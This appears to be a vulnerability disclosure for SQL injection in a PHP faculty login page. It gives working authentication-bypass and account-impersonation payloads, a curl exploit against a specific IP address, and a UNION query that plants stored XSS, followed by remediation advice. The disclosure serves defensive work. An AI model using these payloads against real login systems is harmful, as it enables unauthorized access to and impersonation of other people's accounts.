
# Authentication Bypass via SQL Injection in Faculty Login

## Summary

The `loginlinkfaculty.php` endpoint is vulnerable to **SQL Injection (CWE-89)** because user-controlled input from the `fid` (Faculty ID) and `pass` (Password) parameters is concatenated directly into an SQL query without using prepared statements or parameterized queries.

An unauthenticated attacker can exploit this vulnerability to bypass authentication, impersonate arbitrary faculty accounts, obtain a valid authenticated PHP session, and potentially chain the issue with other authenticated vulnerabilities.

In addition, if the application displays the session variable `$_SESSION["fname"]` without proper output encoding, a UNION-based SQL Injection can be leveraged to achieve **Stored XSS** through the authenticated session.

---

## Vulnerability Details

### Vulnerable Code

```php
$x = $_POST["fid"];
$y = $_POST["pass"];

$sql = "SELECT * FROM facutlytable
        WHERE FID='" . $x . "'
        AND Pass='" . $y . "'";
```

Because both parameters are directly concatenated into the SQL statement, an attacker can inject arbitrary SQL syntax.

---

## Impact

Successful exploitation allows an attacker to:

- Bypass authentication.
- Login without valid credentials.
- Impersonate arbitrary faculty members.
- Obtain a valid authenticated PHP session.
- Access protected faculty functionality.
- Chain with additional authenticated vulnerabilities.
- Potentially perform Stored XSS using UNION-based SQL Injection.

---

# Proof of Concept

## 1. Classic Authentication Bypass

**Faculty ID**

```text
1' OR '1'='1' -- -
```

**Password**

```text
x
```

Generated SQL:

```sql
SELECT *
FROM facutlytable
WHERE FID='1'
OR '1'='1' -- -'
AND Pass='x'
```

The comment sequence removes the password verification and the condition `'1'='1'` always evaluates to TRUE, allowing authentication without valid credentials.

---

## 2. Impersonate a Specific Faculty Account

Instead of authenticating as the first returned record, an attacker can directly authenticate as any faculty member by specifying its identifier.

**Faculty ID**

```text
102' -- -
```

**Password**

```text
x
```

Generated SQL:

```sql
SELECT *
FROM facutlytable
WHERE FID='102' -- -'
AND Pass='x'
```

The password validation is removed, allowing login as the faculty member whose `FID` is `102`.

---

## 3. Password Field Bypass

If the application filters the Faculty ID field but not the password field, authentication can still be bypassed.

**Faculty ID**

```text
x
```

**Password**

```text
' OR '1'='1
```

Generated SQL:

```sql
WHERE FID='x'
AND Pass=''
OR '1'='1'
```

Due to SQL operator precedence:

```sql
(FID='x' AND Pass='')
OR ('1'='1')
```

The condition always evaluates to TRUE.

---

# Reproduction

## Through the Login Form

Open:

```
facultylogin.php
```

Use the following values:

```
Faculty ID:
1' OR '1'='1' -- -

Password:
x
```

Click **Login**.

The application authenticates successfully and redirects to:

```
welcomefaculty.php
```

without requiring valid credentials.

---

## Using curl

```bash
curl -i -X POST http://172.25.44.135:9292/loginlinkfaculty.php \
  --data-urlencode "fid=1' OR '1'='1' -- -" \
  --data-urlencode "pass=x" \
  -c cookies.txt
```

Successful exploitation returns:

```
HTTP/1.1 302 Found
Location: welcomefaculty.php
Set-Cookie: PHPSESSID=...
```

The returned session cookie grants authenticated access to faculty functionality.

---

# Session Abuse

After authentication, the application stores user information inside the PHP session:

```php
$_SESSION["fidx"] = $row["FID"];
$_SESSION["fname"] = $row["FName"];
```

Any subsequent request using the returned `PHPSESSID` is treated as an authenticated faculty member.

---

# Stored XSS via UNION Injection

If `welcomefaculty.php` renders `$_SESSION["fname"]` without output encoding, SQL Injection can be combined with a UNION query to inject arbitrary JavaScript into the session.

Example payload:

```text
' UNION SELECT
1,
'<script>alert(document.domain)</script>',
3,4,5,6,7,8,9
-- -
```

Password:

```text
x
```

The injected value becomes:

```php
$_SESSION["fname"]
```

If the welcome page later executes:

```php
echo $_SESSION["fname"];
```

without using:

```php
htmlspecialchars()
```

the payload executes every time the welcome page is loaded during the authenticated session.

This creates a Stored XSS condition through SQL Injection.

---

# Security Impact

- Authentication Bypass
- Account Impersonation
- Unauthorized Access
- Session Hijacking Opportunities
- Privilege Escalation
- Stored XSS (when combined with unsafe output)
- Complete compromise of faculty accounts

---

# CWE

- CWE-89 — Improper Neutralization of Special Elements used in an SQL Command (SQL Injection)
- CWE-79 — Improper Neutralization of Input During Web Page Generation (Stored XSS, if applicable)

---

# Remediation

- Replace dynamic SQL concatenation with prepared statements.
- Use parameterized queries for every database operation.
- Store passwords using `password_hash()` and verify them with `password_verify()`.
- Encode all user-controlled output using `htmlspecialchars()`.
- Apply server-side input validation.
- Implement least-privilege database permissions.
- Log and monitor authentication anomalies.

---

# References

- https://owasp.org/www-community/attacks/SQL_Injection
- https://owasp.org/Top10/A03_2021-Injection/
- https://cwe.mitre.org/data/definitions/89.html
- https://cwe.mitre.org/data/definitions/79.html


<img width="1155" height="470" alt="image" src="https://github.com/user-attachments/assets/bea6f85c-0cb6-42a8-b742-27919ed73b42" />

<img width="1292" height="296" alt="image" src="https://github.com/user-attachments/assets/ce13bbf7-4765-4a17-8dac-edfe67ff78fa" />
